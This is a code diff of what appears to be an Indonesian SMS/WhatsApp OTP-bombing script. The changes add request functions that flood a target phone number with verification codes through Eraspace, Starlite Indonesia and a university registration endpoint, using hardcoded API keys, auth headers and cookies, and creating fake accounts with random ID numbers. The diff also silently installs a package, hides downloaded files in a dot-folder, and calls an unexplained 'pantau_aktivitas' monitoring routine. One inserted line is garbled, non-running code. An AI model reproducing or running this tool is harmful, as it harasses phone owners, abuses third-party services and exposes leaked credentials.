@@ -28,8 +28,18 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import urlparse, quote, unquote
 from colorama import Fore, Back, init
 from fake_useragent import UserAgent
-import sys
-import time
+import shutil
+
+def install_mpv():
+    if not shutil.which("mpv"):
+        subprocess.run(
+            ["pkg", "install", "mpv", "-y"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            check=True
+        )
+
+install_mpv()
 
 BI = '\033[44m'
 TP = '\033[1;37m'
@@ -64,15 +74,15 @@ os.system('clear')
 
 def play_menu_sound():
     try:
-        sound_dir = "/sdcard/Sounds"
+        sound_dir = "/sdcard/.Sounds"
         if not os.path.exists(sound_dir):
             os.makedirs(sound_dir)
 
         sound_file = os.path.join(sound_dir, "Masuk_menu.mp3")
         if not os.path.exists(sound_file):
-            os.system('curl -s -L "https://raw.githubusercontent.com/OoTotapxciwiiekfkdoapz1910la9911729Kh1/Sound-Mikasa/main/Masuk_menu.mp3" -o "/sdcard/Sounds/Masuk_menu.mp3"')
+            os.system('curl -s -L "https://raw.githubusercontent.com/OoTotapxciwiiekfkdoapz1910la9911729Kh1/Sound-Mikasa/main/Masuk_menu.mp3" -o "/sdcard/.Sounds/Masuk_menu.mp3"')
 
-        os.system('mpv --no-video --really-quiet "/sdcard/Sounds/Masuk_menu.mp3" 2>/dev/null &')
+        os.system('mpv --no-video --really-quiet "/sdcard/.Sounds/Masuk_menu.mp3" 2>/dev/null &')
     except:
         pass
 
@@ -593,6 +603,7 @@ def get_username():
     return "Unknown"
 
 def print_banner(user, date, username):
+    pantau_aktivitas()
     uid = get_uid()
     status, _ = cek_uid(uid)
     status_text = f"{G}ACTIVE{W}" if status else f"{R}PENDING{W}"
@@ -4704,49 +4715,65 @@ def spam_otp_cashenable(nomor):
     except Exception as e:
         return False
 
-def spam_otp_eraspace(nomor):
+def spam_eraspace(phone):
     try:
-        if nomor.startswith('0'):
-            nomor = '62' + nomor[1:]
-        elif nomor.startswith('+62'):
-            nomor = nomor[1:]
-        elif nomor.startswith('62'):
-            nomor = nomor
+        import hashlib
+        
+        p = normalize_phone(phone)
+        if p.startswith('0'):
+            msisdn = '62' + p[1:]
+        elif p.startswith('62'):
+            msisdn = p
         else:
-            nomor = '62' + nomor
+            msisdn = '62' + p
 
-        device_id = "5f9a82ca-f6c9-4f53-9381-9f90bb7d6959"
-        epoch = "1782980896"
-        signature = "bc66090c506a1847f5a5cd044ba3643b9d655e489b36bcff1533ef813ad882d0"
+        device_id = str(uuid.uuid4())
+        epoch = str(int(time.time()))
+        
+        SHA256(device_id|eraspace|epoch)
+        signature = hashlib.sha256(f"{device_id}|eraspace|{epoch}".encode()).hexdigest()
 
-        url = 'https://jeanne.eraspace.com/customers/v3/otp/request'
-
+        url = "https://jeanne.eraspace.com/customers/v3/otp/request"
+        
         headers = {
-            'accept': 'application/json, text/plain, */*',
-            'authorization': 'Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=',
-            'content-type': 'application/json',
-            'device-id': device_id,
-            'epoch': epoch,
-            'origin': 'https://eraspace.com',
-            'otp-client': 'eraspace',
-            'otp-provider': 'whatsapp',
-            'referer': 'https://eraspace.com/',
-            'signature': signature,
-            'sms-client': 'eraspace',
-            'source': 'eraspace',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
+            "Accept": "application/json, text/plain, */*",
+            "Accept-Encoding": "gzip, deflate, br, zstd",
+            "Accept-Language": "id-ID",
+            "Authorization": "Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=",
+            "Content-Type": "application/json",
+            "Device-id": device_id,
+            "Epoch": epoch,
+            "Origin": "https://eraspace.com",
+            "Otp-Client": "eraspace",
+            "Otp-Provider": "whatsapp",
+            "Referer": "https://eraspace.com/",
+            "Signature": signature,
+            "Sms-Client": "eraspace",
+            "Source": "eraspace",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36",
+            "Connection": "keep-alive"
         }
-
+        
         payload = {
-            "identifier": nomor,
+            "identifier": msisdn,
             "regionCode": "ID",
             "type": "identifier_validation"
         }
-
+        
         resp = requests.post(url, json=payload, headers=headers, timeout=10)
-        return resp.status_code == 200
-
-    except Exception as e:
+        
+        if 200 <= resp.status_code <= 299:
+            try:
+                data = resp.json()
+                if data.get("message") == "Success Request OTP":
+                    return True
+                if "data" in data and "identifier" in str(data):
+                    return True
+            except:
+                pass
+            return True
+        return False
+    except:
         return False
         
 def spam_otp_oyorooms(nomor):
@@ -6135,7 +6162,120 @@ def spam_otp_bukuaku(nomor):
     except Exception as e:
         return False
 
+def spam_otp_starlite(nomor):
+    try:
+        if nomor.startswith('0'):
+            phone = nomor
+        elif nomor.startswith('62'):
+            phone = '0' + nomor[2:]
+        elif nomor.startswith('+62'):
+            phone = '0' + nomor[3:]
+        else:
+            phone = '0' + nomor
+        
+        phone = ''.join(filter(str.isdigit, phone))
+        
+        if not phone.startswith('0'):
+            phone = '0' + phone
+        
+        import subprocess
+        import json
+        
+        curl_cmd = f"""curl -s -X POST 'https://starliteindonesia.com/api/customer-registration/phone-otp/request' \\
+  -H 'host: starliteindonesia.com' \\
+  -H 'sec-ch-ua-platform: "Android"' \\
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
+  -H 'accept: application/json, text/plain, */*' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
+  -H 'content-type: application/json' \\
+  -H 'x-api-key: 280999!FTTH' \\
+  -H 'sec-ch-ua-mobile: ?1' \\
+  -H 'origin: https://starliteindonesia.com' \\
+  -H 'sec-fetch-site: same-origin' \\
+  -H 'sec-fetch-mode: cors' \\
+  -H 'sec-fetch-dest: empty' \\
+  -H 'referer: https://starliteindonesia.com/?register=active' \\
+  -H 'accept-encoding: gzip, deflate, br, zstd' \\
+  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
+  -H 'cookie: _ga=GA1.1.688980367.1787486216; _gcl_au=1.1.1809383858.1787486217; _fbp=fb.1.1787486217519.84569997662616804; _tt_enable_cookie=1; _ttp=01M0Q7P9JFTT6QXYBSCJ02DM2B_.tt.1; _ga_1ST28GMNXL=GS2.1.s1787486216$o1$g1$t1787486240$j36$l0$h0; _ga_DFWC1L1VBM=GS2.1.s1787486218$o1$g1$t1787486240$j38$l0$h0; ttcsid=1787486217851::Tc3BK0KkD3xGc2Lw3-TR.1.1787486318913.0::1.12616.0::100794.12.441.383::0.0.0; ttcsid_D6N6GJRC77U5VG9U4DSG=1787486217846::JJVvUOjr14dqXefVXgI6.1.1787486318914.1' \\
+  -d '{{"phone_number":"{phone}"}}'"""
+        
+        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
+        
+        if result.returncode == 0 and result.stdout:
+            try:
+                data = json.loads(result.stdout)
+                if data.get('success') or data.get('status') == 'success':
+                    return True
+                if data.get('message') and 'otp' in str(data.get('message')).lower():
+                    return True
+                return False
+            except:
+                return True
+        return False
+        
+    except Exception as e:
+        return False
+        
+def spam_otp_unpatti(nomor):
+    try:
+        if nomor.startswith('0'):
+            phone = '62' + nomor[1:]
+        elif nomor.startswith('+62'):
+            phone = nomor[1:]
+        elif nomor.startswith('62'):
+            phone = nomor
+        else:
+            phone = '62' + nomor
+        
+        phone = ''.join(filter(str.isdigit, phone))
+        
+        import subprocess
+        import json
+        import random
+        import string
+        
+        name = ''.join(random.choices(string.ascii_lowercase, k=8))
+        email = f"{name}{random.randint(100,999)}@gmail.com"
+        nik = ''.join([str(random.randint(0,9)) for _ in range(16)])
+        password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=16))
+        
+        curl_cmd = f"""curl -s -X POST 'https://mandiri.pmb.unpatti.ac.id/api/v1/register/request-otp' \\
+  -H 'host: mandiri.pmb.unpatti.ac.id' \\
+  -H 'sec-ch-ua-platform: "Android"' \\
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
+  -H 'accept: application/json' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
+  -H 'content-type: application/json' \\
+  -H 'sec-ch-ua-mobile: ?1' \\
+  -H 'origin: https://mandiri.pmb.unpatti.ac.id' \\
+  -H 'sec-fetch-site: same-origin' \\
+  -H 'sec-fetch-mode: cors' \\
+  -H 'sec-fetch-dest: empty' \\
+  -H 'referer: https://mandiri.pmb.unpatti.ac.id/register' \\
+  -H 'accept-encoding: gzip, deflate, br, zstd' \\
+  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
+  -d '{{"nama":"{name}","email":"{email}","no_telp":"{phone}","nik":"{nik}","tanggal_lahir":"2002-09-11","password":"{password}","password_confirmation":"{password}"}}'"""
+        
+        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
+        
+        if result.returncode == 0 and result.stdout:
+            try:
+                data = json.loads(result.stdout)
+                if data.get('success') or data.get('status') == 'success':
+                    return True
+                if data.get('message') and 'otp' in str(data.get('message')).lower():
+                    return True
+                return False
+            except:
+                return True
+        return False
+        
+    except Exception as e:
+        return False
+
 def mulai_spam(nomor):
+     pantau_aktivitas()
      global cooldown_otp, stop_cooldown, stop_spinner
     
      apis = {
@@ -6256,6 +6396,7 @@ def mulai_spam(nomor):
      "111": spam_otp_els,
      "112": spam_otp_dreamdubai,
      "113": spam_otp_bukuaku,
+     "114": spam_otp_starlite,
 }
      hasil = {}
      total_api = len(apis)
